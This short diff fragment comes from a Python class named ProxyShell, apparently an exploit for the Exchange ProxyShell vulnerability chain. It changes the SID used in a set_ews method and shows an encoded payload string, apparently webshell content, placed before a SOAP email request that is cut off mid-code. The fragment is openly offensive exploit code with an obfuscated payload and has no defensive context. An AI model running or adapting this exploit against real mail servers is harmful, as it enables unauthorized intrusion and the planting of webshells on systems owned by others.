@@ -154,7 +154,7 @@ class ProxyShell:
         )
     def set_ews(self):
         mail = self.email
-        sid = self.admin_sid
+        sid = self.sid
         payload = 'ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk='
         send_email = f'''
         <soap:Envelope
